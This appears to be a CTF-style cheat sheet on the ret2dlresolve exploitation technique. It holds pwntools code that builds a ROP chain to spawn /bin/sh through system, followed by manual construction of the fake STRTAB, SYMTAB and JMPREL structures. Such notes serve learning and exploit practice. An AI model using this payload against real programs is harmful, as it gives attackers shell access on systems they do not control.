```python
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(context.binary, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr) # don't forget this step, but use any function you like
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

offset = 64
p.sendline(fit({offset+context.bytes*3: raw_rop, 200: dlresolve.payload}))
```

`readelf -d vuln` to get address of SYMTAB, STRTAB and JMPREL.

3 structures need to be faked: the STRTAB entry, SYMTAB entry and JMPREL struct.

## STRTAB

STRTAB just contains the name of the symbol. After writing the string, we need to calculate offset via fake_loc -
STRTAB.

## SYMTAB

SYMTAB (64-bit) is built as such:

```python
Elf64_Sym_addr = writable_region
sym_idx = int((Elf64_Sym_addr - symtab) / 24)

st_name = p32(str_idx)
st_info = p8(0x12)
st_other = p8(0)
st_shndx = p16(0)
st_value = p64(0)
st_size = p64(0)
Elf64_Sym_struct = st_name \
        + st_info \
        + st_other \
        + st_shndx \
        + st_value \
        + st_size
```

## JMPREL

JMPREL (64-bit) is built as such:

```python
Elf64_Rel_addr = writable_region
reloc_arg = int((Elf64_Rel_addr - jmprel) / 24)

r_offset = p64(0x404020) # offset to GOT entry to be written, doesn't matter much except must be writable
r_info = p64((sym_idx << 32) | 0x7)
Elf64_Rel_struct = r_offset + r_info
```
